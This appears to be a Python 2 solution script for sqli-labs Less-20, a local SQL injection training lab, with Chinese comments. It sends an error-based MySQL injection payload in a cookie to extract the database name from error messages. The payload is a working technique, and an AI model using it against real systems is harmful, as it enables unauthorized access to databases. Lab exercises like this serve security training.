# # -*- coding:utf-8 -*-

# ua报错注入，这道题需要知道账号密码

import requests
import string
import datetime
from bs4 import BeautifulSoup
import re

# 因为使用rand()所以要多试几次
header = {'cookie':"uname=admin' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)b)#"}

url = "http://127.0.0.1/sqli/Less-20/"

data = string.digits+string.lowercase

length = ""
def load(url):
    # global length
    # for j in range(1,10):
    #     for i in xrange(48,126):
    datas = {
            'uname':"admin",
            'passwd':"",
            'submit':'Submit'
    }
    # starttime = datetime.datetime.now()
    response1 = requests.post(url,data=datas)
    response = requests.get(url,headers=header)
    # response=response.text
    # endtime = datetime.datetime.now()
    soup = BeautifulSoup(str(response.content),'lxml')
    r = soup.find_all(name='font',attrs={'size':4,'color':'#FFFF00'})
    for i in r:
        reg = re.compile(r'<br/>Issue with your mysql: (.*?)</font>')
        print re.findall(reg,str(i))[0]

load (url)